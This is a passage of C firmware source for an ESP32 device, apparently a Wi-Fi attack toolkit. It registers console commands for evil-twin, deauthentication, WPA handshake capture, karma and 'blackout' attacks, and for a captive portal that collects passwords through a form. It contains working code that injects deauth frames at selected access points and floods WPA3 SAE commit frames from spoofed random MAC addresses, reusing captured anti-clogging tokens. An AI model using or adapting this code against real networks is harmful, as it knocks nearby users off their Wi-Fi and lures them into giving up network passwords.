    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
    
    // Catch-all handler for other requests
    httpd_uri_t captive_uri = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = captive_portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_uri);
    
    // Register RFC 8908 Captive Portal API endpoint
    httpd_uri_t captive_api_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_GET,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_uri);
    
    // Register RFC 8908 Captive Portal API endpoint for POST/OPTIONS
    httpd_uri_t captive_api_post_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_POST,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
    
    // Register RFC 8908 Captive Portal API endpoint for OPTIONS
    httpd_uri_t captive_api_options_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_OPTIONS,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
    
    // Set portal as active (must be before starting DNS task)
    portal_active = true;
    MY_LOG_INFO(TAG, "Portal marked as active");
    
    // Start DNS server task
    BaseType_t task_ret = xTaskCreate(
        dns_server_task,
        "dns_server",
        4096,
        NULL,
        5,
        &dns_server_task_handle
    );
    
    if (task_ret != pdPASS) {
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        esp_wifi_stop();
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Captive portal started successfully!");
    MY_LOG_INFO(TAG, "AP Name: %s", ssid);
    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the portal", ssid);

    esp_err_t led_err = led_set_color(255, 0, 255); // Purple for portal mode
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for portal mode: %s", esp_err_to_name(led_err));
    }
    
    return 0;
}

// --- Command registration in esp_console ---
static void register_commands(void)
{
    const esp_console_cmd_t scan_cmd = {
        .command = "scan_networks",
        .help = "Starts background network scan",
        .hint = NULL,
        .func = &cmd_scan_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));

    const esp_console_cmd_t show_scan_cmd = {
        .command = "show_scan_results",
        .help = "Shows results from last network scan",
        .hint = NULL,
        .func = &cmd_show_scan_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_scan_cmd));
    

    const esp_console_cmd_t sniffer_cmd = {
        .command = "start_sniffer",
        .help = "Starts network client sniffer",
        .hint = NULL,
        .func = &cmd_start_sniffer,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_cmd));

    const esp_console_cmd_t packet_monitor_cmd = {
        .command = "packet_monitor",
        .help = "Monitor packets per second on a channel: packet_monitor <channel>",
        .hint = NULL,
        .func = &cmd_packet_monitor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&packet_monitor_cmd));

    const esp_console_cmd_t channel_view_cmd = {
        .command = "channel_view",
        .help = "Continuously scan and print Wi-Fi channel utilization",
        .hint = NULL,
        .func = &cmd_channel_view,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&channel_view_cmd));


    const esp_console_cmd_t show_sniffer_cmd = {
        .command = "show_sniffer_results",
        .help = "Shows sniffer results sorted by client count",
        .hint = NULL,
        .func = &cmd_show_sniffer_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_sniffer_cmd));

    const esp_console_cmd_t show_probes_cmd = {
        .command = "show_probes",
        .help = "Shows captured probe requests with SSIDs",
        .hint = NULL,
        .func = &cmd_show_probes,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_probes_cmd));

    const esp_console_cmd_t list_probes_cmd = {
        .command = "list_probes",
        .help = "Lists probe requests with index and SSID",
        .hint = NULL,
        .func = &cmd_list_probes,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_probes_cmd));

    const esp_console_cmd_t sniffer_debug_cmd = {
        .command = "sniffer_debug",
        .help = "Enable/disable detailed sniffer debug logging: sniffer_debug <0|1>",
        .hint = NULL,
        .func = &cmd_sniffer_debug,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_debug_cmd));

    const esp_console_cmd_t sniffer_dog_cmd = {
        .command = "start_sniffer_dog",
        .help = "Starts Sniffer Dog - captures AP-STA pairs and sends targeted deauth packets",
        .hint = NULL,
        .func = &cmd_start_sniffer_dog,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_dog_cmd));

    const esp_console_cmd_t select_cmd = {
        .command = "select_networks",
        .help = "Selects networks by indexes: select_networks 0 2 5",
        .hint = NULL,
        .func = &cmd_select_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_cmd));

    const esp_console_cmd_t start_cmd = {
        .command = "start_evil_twin",
        .help = "Starts Evil Twin attack.",
        .hint = NULL,
        .func = &cmd_start_evil_twin,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&start_cmd));

    const esp_console_cmd_t deauth_cmd = {
        .command = "start_deauth",
        .help = "Starts Deauth attack.",
        .hint = NULL,
        .func = &cmd_start_deauth,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));

    const esp_console_cmd_t handshake_cmd = {
        .command = "start_handshake",
        .help = "Starts WPA Handshake capture attack. With selected networks: attacks only those. Without: scans every 5min and attacks all.",
        .hint = NULL,
        .func = &cmd_start_handshake,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_cmd));

    const esp_console_cmd_t save_handshake_cmd = {
        .command = "save_handshake",
        .help = "Manually saves captured handshake to SD card (only if complete 4-way handshake).",
        .hint = NULL,
        .func = &cmd_save_handshake,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&save_handshake_cmd));

       const esp_console_cmd_t sae_overflow_cmd = {
        .command = "sae_overflow",
        .help = "Starts SAE WPA3 Client Overflow attack.",
        .hint = NULL,
        .func = &cmd_start_sae_overflow,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sae_overflow_cmd));

    const esp_console_cmd_t blackout_cmd = {
        .command = "start_blackout",
        .help = "Starts blackout attack - scans all networks every 3 minutes, sorts by channel, attacks all",
        .hint = NULL,
        .func = &cmd_start_blackout,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&blackout_cmd));

    const esp_console_cmd_t wardrive_cmd = {
        .command = "start_wardrive",
        .help = "Starts wardriving with GPS and SD logging",
        .hint = NULL,
        .func = &cmd_start_wardrive,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_cmd));

    const esp_console_cmd_t portal_cmd = {
        .command = "start_portal",
        .help = "Starts captive portal with password form: start_portal <SSID>",
        .hint = NULL,
        .func = &cmd_start_portal,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));

    const esp_console_cmd_t karma_cmd = {
        .command = "start_karma",
        .help = "Starts Karma attack with SSID from probe list: start_karma <index>",
        .hint = NULL,
        .func = &cmd_start_karma,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&karma_cmd));

    const esp_console_cmd_t vendor_cmd = {
        .command = "vendor",
        .help = "Controls vendor lookup: vendor set <on|off> | vendor read",
        .hint = NULL,
        .func = &cmd_vendor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&vendor_cmd));

    const esp_console_cmd_t boot_button_cmd = {
        .command = "boot_button",
        .help = "Configure boot button actions: boot_button read|list|set <short|long> <command>|status <short|long> <on|off>",
        .hint = NULL,
        .func = &cmd_boot_button,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&boot_button_cmd));

    const esp_console_cmd_t led_cmd = {
        .command = "led",
        .help = "Controls status LED: led set <on|off> | led level <1-100> | led read",
        .hint = NULL,
        .func = &cmd_led,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&led_cmd));

    const esp_console_cmd_t channel_time_cmd = {
        .command = "channel_time",
        .help = "Controls scan channel time: channel_time set <min|max> <ms> | channel_time read <min|max>",
        .hint = NULL,
        .func = &cmd_channel_time,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&channel_time_cmd));

    const esp_console_cmd_t download_cmd = {
        .command = "download",
        .help = "Force reboot into ROM download (UART flashing) mode",
        .hint = NULL,
        .func = &cmd_download,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&download_cmd));

    const esp_console_cmd_t stop_cmd = {
        .command = "stop",
        .help = "Stop all running operations",
        .hint = NULL,
        .func = &cmd_stop,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&stop_cmd));

    const esp_console_cmd_t reboot_cmd = {
        .command = "reboot",
        .help = "Device reboot to start from scratch",
        .hint = NULL,
        .func = &cmd_reboot,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));

    const esp_console_cmd_t ping_cmd = {
        .command = "ping",
        .help = "Connectivity test: prints pong",
        .hint = NULL,
        .func = &cmd_ping,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ping_cmd));

    const esp_console_cmd_t list_sd_cmd = {
        .command = "list_sd",
        .help = "Lists HTML files on SD card",
        .hint = NULL,
        .func = &cmd_list_sd,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_sd_cmd));

    const esp_console_cmd_t list_dir_cmd = {
        .command = "list_dir",
        .help = "List files inside a directory on SD card: list_dir [path]",
        .hint = NULL,
        .func = &cmd_list_dir,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_dir_cmd));

    const esp_console_cmd_t list_ssid_cmd = {
        .command = "list_ssid",
        .help = "Lists SSIDs from /sdcard/lab/ssid.txt",
        .hint = NULL,
        .func = &cmd_list_ssid,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_ssid_cmd));

    const esp_console_cmd_t file_delete_cmd = {
        .command = "file_delete",
        .help = "Delete a file on SD card: file_delete <path>",
        .hint = NULL,
        .func = &cmd_file_delete,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&file_delete_cmd));

    const esp_console_cmd_t select_html_cmd = {
        .command = "select_html",
        .help = "Load custom HTML from SD card: select_html <index>",
        .hint = NULL,
        .func = &cmd_select_html,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_html_cmd));
}

void app_main(void) {

    printf("\n\n=== APP_MAIN START (v" JANOS_VERSION ") ===\n");
    
    // esp_log_level_set("wifi", ESP_LOG_INFO);
    // esp_log_level_set("projectZero", ESP_LOG_INFO);
    // esp_log_level_set("espnow", ESP_LOG_INFO);

    // esp_log_level_set("wifi", ESP_LOG_DEBUG);
    // esp_log_level_set(TAG, ESP_LOG_DEBUG);
    // esp_log_level_set("espnow", ESP_LOG_DEBUG);

#ifdef CONFIG_SPIRAM
    printf("Step 1: Manual PSRAM init\n");
    
    // Manual PSRAM initialization (CONFIG_SPIRAM_BOOT_INIT=n)
    esp_err_t ret1 = esp_psram_init();
    if (ret1 == ESP_OK) {
        size_t psram_size = esp_psram_get_size();
        printf("PSRAM initialized successfully, size: %zu bytes\n", psram_size);
        
        printf("Step 2: Test PSRAM malloc\n");
        void* ptr = heap_caps_malloc(1024, MALLOC_CAP_SPIRAM);
        if (ptr != NULL) {
            printf("Malloc from PSRAM succeeded\n");
            heap_caps_free(ptr);
        } else {
            printf("Malloc from PSRAM failed\n");
        }
    } else {
        printf("PSRAM init failed: %s (continuing without PSRAM)\n", esp_err_to_name(ret1));
    }
#else
    printf("PSRAM support disabled in config\n");
#endif

    printf("Step 3: Init NVS\n");
    ESP_ERROR_CHECK(nvs_flash_init());
    printf("NVS initialized OK\n");

    channel_time_load_state_from_nvs();

    printf("Step 4: Init LED strip\n");
    // 1. LED strip configuration
    led_strip_config_t strip_cfg = {
        .strip_gpio_num            = NEOPIXEL_GPIO,
        .max_leds                  = LED_COUNT,
        .led_model                 = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags.invert_out          = false,
    };

    // 2. LED Strip RMT configuration
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src        = RMT_CLK_SRC_DEFAULT,
        .resolution_hz  = RMT_RES_HZ,
        .flags.with_dma = false,
    };

    // 3. strip instance
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip));
    printf("LED strip initialized OK\n");

    led_initialized = true;
    printf("Step 5: LED boot sequence\n");
    led_boot_sequence();
    printf("Step 6: Vendor load state\n");
    MY_LOG_INFO(TAG, "Status LED ready (brightness %u%%, %s)", led_brightness_percent, led_user_enabled ? "on" : "off");
    vendor_load_state_from_nvs();
    vendor_last_valid = false;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
    vendor_file_checked = false;
    vendor_file_present = false;
    vendor_record_count = 0;
    printf("Step 7: Boot config load\n");
    boot_config_load_from_nvs();

    printf("Step 8: WiFi init\n");
    ESP_ERROR_CHECK(wifi_init_ap_sta());
    printf("WiFi initialized OK\n"); 

    wifi_country_t wifi_country = {
        .cc = "PH",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_AUTO,
    };
    esp_err_t retC = esp_wifi_set_country(&wifi_country);
    if (retC != ESP_OK) {
           ESP_LOGE(TAG, "Failed to set Wi-Fi country code: %s", esp_err_to_name(retC));
    } else {
           ESP_LOGW(TAG, "Wi-Fi country code set to %s", wifi_country.cc);
    }


    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
     MY_LOG_INFO(TAG,"");
    MY_LOG_INFO(TAG,"Available commands:");
    MY_LOG_INFO(TAG,"  scan_networks");
    MY_LOG_INFO(TAG,"  show_scan_results");
    MY_LOG_INFO(TAG,"  select_networks <index1> [index2] ...");
    MY_LOG_INFO(TAG,"  start_evil_twin");
    MY_LOG_INFO(TAG,"  start_deauth");
    MY_LOG_INFO(TAG,"  sae_overflow");
    MY_LOG_INFO(TAG,"  start_blackout");
    MY_LOG_INFO(TAG,"  start_wardrive");
    MY_LOG_INFO(TAG,"  start_portal <SSID>");
    MY_LOG_INFO(TAG,"  list_sd");
    MY_LOG_INFO(TAG,"  list_dir <path>");
    MY_LOG_INFO(TAG,"  list_ssid");
    MY_LOG_INFO(TAG,"  select_html <index>");
    MY_LOG_INFO(TAG,"  file_delete <path>");
    MY_LOG_INFO(TAG,"  start_sniffer");
    MY_LOG_INFO(TAG,"  packet_monitor <channel>");
    MY_LOG_INFO(TAG,"  channel_view");
    MY_LOG_INFO(TAG,"  show_sniffer_results");
    MY_LOG_INFO(TAG,"  show_probes");
    MY_LOG_INFO(TAG,"  sniffer_debug <0|1>");
    MY_LOG_INFO(TAG,"  start_sniffer_dog");
    MY_LOG_INFO(TAG,"  vendor set <on|off> | vendor read");
    MY_LOG_INFO(TAG,"  boot_button read|list|set|status");
    MY_LOG_INFO(TAG,"  led set <on|off> | led level <1-100> | led read");
    MY_LOG_INFO(TAG,"  channel_time set <min|max> <ms> | channel_time read <min|max>");
    MY_LOG_INFO(TAG,"  download");
    MY_LOG_INFO(TAG,"  ping");
    MY_LOG_INFO(TAG,"  stop");
    MY_LOG_INFO(TAG,"  reboot");

    repl_config.prompt = ">";
    repl_config.max_cmdline_length = 100;

    esp_console_register_help_command();
    register_commands();

    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
    vTaskDelay(pdMS_TO_TICKS(500));

    gpio_config_t boot_button_config = {
        .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };
    ESP_ERROR_CHECK(gpio_config(&boot_button_config));

    if (boot_button_task_handle == NULL) {
        BaseType_t boot_task_created = xTaskCreate(
            boot_button_task,
            "boot_button",
            BOOT_BUTTON_TASK_STACK_SIZE,
            NULL,
            BOOT_BUTTON_TASK_PRIORITY,
            &boot_button_task_handle
        );
        if (boot_task_created != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create boot button task");
            boot_button_task_handle = NULL;
        }
    }
    
    // Initialize SD card and create necessary directories
    esp_err_t sd_init_ret = init_sd_card();
    if (sd_init_ret == ESP_OK) {
        create_sd_directories();
        report_ssid_file_status();
        if (vendor_is_enabled()) {
            ensure_vendor_file_checked();
        }
    }
    
    // Load BSSID whitelist from SD card
    load_whitelist_from_sd();
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG,"BOARD READY");
    vTaskDelay(pdMS_TO_TICKS(100));
    
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    //proceed with deauth frames on channels of the APs:
    // Use target_bssids[] directly to avoid index confusion after periodic re-scan
    for (int i = 0; i < target_bssid_count; ++i) {
        if (applicationState == EVIL_TWIN_PASS_CHECK ) {
            ESP_LOGW(TAG, "Checking for password...");
            return;
        }
        
        // Check for stop request
        if (operation_stop_requested) {
            ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
            return;
        }

        if (!target_bssids[i].active) continue;
        
        // Check if BSSID is whitelisted - but ONLY during blackout attack, not during regular deauth
        if (blackout_attack_active && is_bssid_whitelisted(target_bssids[i].bssid)) {
            // MY_LOG_INFO(TAG, "Skipping whitelisted BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
            //            target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
            //            target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5]);
            continue;
        }
        
        // During evil twin with connected clients, only attack networks on same channel as first selected network
        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel; // First selected network's channel
            if (target_bssids[i].channel != first_network_channel) {
                // Skip networks on different channels when clients are connected
                continue;
            }
            // Only send deauth on same channel - no channel switch needed since we're already on this channel
        }
        
        // Enhanced logging to debug BSSID mismatch issue
        // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
        //         target_bssids[i].ssid, target_bssids[i].channel,
        //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
        //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
        
        // If no clients connected or not evil twin mode, do normal channel hopping
        if (portal_connected_clients == 0 || applicationState != DEAUTH_EVIL_TWIN) {
            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
        }

        uint8_t deauth_frame[sizeof(deauth_frame_default)];
        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
        memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
        memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        
        // If clients are connected during evil twin, immediately return to first network's channel
        // This ensures we're on the correct channel when clients try to connect to the portal
        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel;
            esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
        }
    }
    
    // After sending all deauth frames, always return to first network's channel during evil twin
    // This maximizes probability of being on correct channel when clients try to connect
    if ((applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
        uint8_t first_network_channel = target_bssids[0].channel;
        esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
    }

}

//SAE WPA3 attack methods:

static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
    (void)ctx;
    esp_fill_random(output, len);
    return 0;
}

static int crypto_init(void) {
    int ret;
    const char *pers = "dragon_drain";

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    // TRNG as entropy source
    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                             trng_random_callback,
                             NULL,
                             (const unsigned char *) pers, strlen(pers));

    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
        return ret;
    }

    mbedtls_ecp_group_init(&ecc_group);
    mbedtls_ecp_point_init(&ecc_element);
    mbedtls_mpi_init(&ecc_scalar);

    ret = mbedtls_ecp_group_load(&ecc_group, MBEDTLS_ECP_DP_SECP256R1);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_group_load failed: %d", ret);
        return ret;
    }

    ESP_LOGI(TAG, "Crypto context initialized with TRNG (secp256r1)");
    return 0;
}

/*
 * Random MAC for client overflow attack.
 */
static void update_spoofed_src_random(void) {
    esp_err_t ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
    if (ret != 0) {
        ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
        return;
    }

    spoofed_src[0] &= 0xFE;  // bit multicast = 0
    spoofed_src[0] |= 0x02;  // locally administered = 1

    next_src = (next_src + 1) % NUM_CLIENTS;
}

// SAE Overflow attack task function (runs in background)
static void sae_attack_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = (wifi_ap_record_t *)pvParameters;
    
    MY_LOG_INFO(TAG, "SAE overflow task started.");
    
    prepareAttack(*ap_record);
    int frame_count_check = 0;
    
    while (sae_attack_active) {
        // Check for stop request (check every 10 frames for better responsiveness)
        if (frame_count_check % 10 == 0) {
            if (operation_stop_requested || !sae_attack_active) {
                MY_LOG_INFO(TAG, "SAE overflow: Stop requested, terminating...");
                operation_stop_requested = false;
                sae_attack_active = false;
                applicationState = IDLE;
                
                // Clean up after attack
                esp_wifi_set_promiscuous(false);
                
                // Restore LED to idle (ignore errors if LED is in invalid state)
                esp_err_t led_err = led_set_idle();
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to restore idle LED after SAE stop: %s", esp_err_to_name(led_err));
                }
                
                break;
            }
            
            // Yield to allow UART console processing every 10 frames
            taskYIELD();
        }
        
        inject_sae_commit_frame();
        
        // Delay to allow UART console processing (50ms gives better responsiveness)
        vTaskDelay(pdMS_TO_TICKS(50));
        frame_count_check++;
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after SAE task: %s", esp_err_to_name(led_err));
    }
    
    // Clean up after attack
    esp_wifi_set_promiscuous(false);
    
    sae_attack_active = false;
    sae_attack_task_handle = NULL;
    MY_LOG_INFO(TAG, "SAE overflow task finished.");
    
    // Free the allocated memory for ap_record
    free(pvParameters);
    
    vTaskDelete(NULL); // Delete this task
}

/*
Injects SAE Commit frame with spoofed source address.
This function generates a random scalar, computes the corresponding ECC point,
and constructs the SAE Commit frame with the spoofed source address.
 */

void inject_sae_commit_frame() {
    uint8_t buf[256];  
    memset(buf, 0, sizeof(buf));
    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
    memcpy(buf + 4, bssid, 6);
    memcpy(buf + 10, spoofed_src, 6);
    memcpy(buf + 16, bssid, 6);

    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size

    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
    int ret;
    size_t scalar_size = 32;

    do {
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
        if (ret != 0) {
            ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
            return;
        }
    } while (mbedtls_mpi_cmp_int(&ecc_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&ecc_scalar, &ecc_group.N) >= 0);

    ret = mbedtls_mpi_write_binary(&ecc_scalar, pos, scalar_size);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_mpi_write_binary failed: %d", ret);
        return;
    }
    pos += scalar_size;

    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
        return;
    }

    uint8_t point_buf[65];
    size_t point_len = 0;
    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED, &point_len, point_buf, sizeof(point_buf));
    if (ret != 0 || point_len != 65) {
        ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
        return;
    }

    memcpy(pos, point_buf + 1, 64);  // skip 0x04 prefix
    pos += 64;

    // Append token:
    if (actLength > 0 && anti_clogging_token != NULL) {
        *pos++ = 0x4C;           // EID
        *pos++ = actLength;      // Length

        memcpy(pos, anti_clogging_token, actLength);
        pos += actLength;
    }

    // Refresh MAC
    update_spoofed_src_random();

    size_t total_len = pos - buf;


    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
    if (ret_tx != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
    } else {
        //log the frame:
        //ESP_LOGD(TAG, "Injecting SAE Commit frame, total length: %d bytes", total_len);
        // for (size_t i = 0; i < total_len; i++) {
        //     printf("%02X ", buf[i]);
        // }
        //printf("\n");
        // Send the frame
    }

    if (frame_count == 0) start_time = esp_timer_get_time();
    frame_count++;

    if (frame_count >= 100) {
        int64_t now = esp_timer_get_time();
        double seconds = (now - start_time) / 1e6;
        double fps = frame_count / seconds;
        
        // Debug logging only (disabled by default to avoid UART spam)
        ESP_LOGD(TAG, "SAE Overflow: AVG FPS: %.2f", fps);
        
        framesPerSecond = (int)fps;
        frame_count = 0;
        if (framesPerSecond == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}


void prepareAttack(const wifi_ap_record_t ap_record) {

    esp_wifi_set_channel(ap_record.primary, WIFI_SECOND_CHAN_NONE );

    //globalDataCount = 1;
    //globalData[0] = strdup((char *)ap_record.ssid);
    memcpy(spoofed_src, base_srcaddr, 6);
    memcpy(bssid, ap_record.bssid, sizeof(bssid));
    next_src = 0;
    if (crypto_init() != 0) {
        ESP_LOGE(TAG, "Crypto initialization failed");
        return;
    }

    //Enable promiscuous mode in order to listen to SAE Commit frames
    ESP_LOGI(TAG, "Enabling promiscuous mode for SAE Commit frames");
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_callback_v1);
    esp_wifi_set_promiscuous(true);

}

void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        parse_sae_commit((const wifi_promiscuous_pkt_t *)buf);
    }
}


static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *buf = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    // Ignore retransmission:
    if (buf[1] & 0x08) return;


    int tods_fromds = buf[1] & 0x03;
    int pos_bssid = 0, pos_src = 0;

    switch (tods_fromds) {
        case 0:
            pos_bssid = 16; pos_src = 10;  break;
        case 1:
            pos_bssid = 4;  pos_src = 10;  break;
        case 2:
            pos_bssid = 10; pos_src = 16;  break;
        default:
            pos_bssid = 10; pos_src = 24;  break;
    }

    // Check if the frame is addressed to the target BSSID
    if (memcmp(buf + pos_bssid, bssid, 6) != 0 ||
        memcmp(buf + pos_src, bssid, 6) != 0)
        return;

    // Beacon detection 
    if (buf[0] == 0x80) {
        //ESP_LOGI(TAG, "Beacon detected from AP");
        return;
    }

    // Searching for SAE Commit
    if (len > 32 && buf[0] == 0xB0 && buf[24] == 0x03 && buf[26] == 0x01) {
        if (buf[28] == 0x4C) {
            const uint8_t *token = buf + 32;
            int token_len = len - 32;

            if (anti_clogging_token) free(anti_clogging_token);
            anti_clogging_token = malloc(token_len);
            if (!anti_clogging_token) {
                ESP_LOGE(TAG, "Mem error: Unable to allocate memory for anti_clogging_token");
                actLength = 0;
                return;
            }

            memcpy(anti_clogging_token, token, token_len);
            actLength = token_len;

            char token_str[token_len * 3 + 1];
            for (int i = 0; i < token_len; i++)
                sprintf(&token_str[i * 3], "%02X ", token[i]);
            token_str[token_len * 3] = '\0';

            //ESP_LOGI(TAG, "  Token: %s", token_str);
        } else if (buf[28] == 0x00) {
            //ESP_LOGI(TAG, "SAE Commit without ACT");
        }
    }
}

